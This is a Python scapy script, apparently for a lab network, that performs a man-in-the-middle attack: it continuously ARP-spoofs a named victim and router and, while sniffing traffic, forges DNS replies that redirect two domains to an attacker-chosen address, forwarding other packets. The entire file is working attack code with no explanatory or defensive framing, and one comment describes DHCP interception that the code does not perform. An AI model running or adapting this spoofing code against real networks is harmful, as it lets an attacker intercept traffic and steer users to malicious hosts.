from scapy.all import *
from scapy.layers.dhcp import DHCP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import ARP
import threading


# Suppress WARNING Message and display only Error Message
conf.logLevel = logging.ERROR

# Interface to use for the attack
INTERFACE = conf.iface 

# Target IP and MAC addresses
VICTIM_IP = "192.168.56.13"
VICTIM_MAC = "B4:45:06:AE:38:68"
ROUTER_IP = "192.168.56.1"
ROUTER_MAC = "00:C8:8B:6D:F8:42"
ATTACKER_IP =  get_if_addr(INTERFACE) # IP of the attacker's machine
# ATTACKER_MAC = get_if_hwaddr(INTERFACE) 

# Malicious DNS records
MALICIOUS_DNS_RECORDS = {
    "poop.com.": "192.168.56.12", 
    "httpforever.com.": "192.168.56.12"
}


# Function to perform ARP spoofing
def arp_spoof():
    while True:
        # Send spoofed ARP responses to the victim and router
        send(ARP(op=2, pdst=VICTIM_IP, psrc=ROUTER_IP, hwdst=VICTIM_MAC), iface=INTERFACE, verbose=False)
        send(ARP(op=2, pdst=ROUTER_IP, psrc=VICTIM_IP, hwdst=ROUTER_MAC), iface=INTERFACE, verbose=False)
        time.sleep(2)


# Function to handle DNS queries
def dns_responder(packet):
    if packet.haslayer(DNS) and packet[DNS].qr == 0:  # DNS query
        queried_domain = packet[DNSQR].qname.decode()
        if queried_domain in MALICIOUS_DNS_RECORDS:
                
                # Create a DNS response
                response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                    UDP(dport=packet[UDP].sport, sport=53) / \
                        DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                            an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=MALICIOUS_DNS_RECORDS[queried_domain]))
                
                # Send the DNS response
                send(response, iface=INTERFACE, verbose=False)
                print(queried_domain, "DNS Response Sent!")
        else:
            # Forward DNS queries not in the malicious records
            send(packet, iface=INTERFACE, verbose=False)
    else:
        # Forward Other Packets if not important to the attack
        send(packet, iface=INTERFACE, verbose=False)

def main():
    print("\nStarting Attack...")
    print(f"Victim IP: {VICTIM_IP}")
    print(f"Victim MAC: {VICTIM_MAC}")
    print(f"Attacker IP: {ATTACKER_IP}")
    # print(f"Attacker MAC: {ATTACKER_MAC}")
    print(f"Router IP: {ROUTER_IP}")
    print(f"Router MAC: {ROUTER_MAC}")
    print(f"Interface: {INTERFACE}")

    # Start ARP spoofing in a separate thread
    arp_thread = threading.Thread(target=arp_spoof)
    arp_thread.start()

    # Sniff DHCP packets and apply interception, and also handle DNS responses
    sniff(prn=dns_responder, iface=INTERFACE)
    
if __name__ == "__main__":
    main()
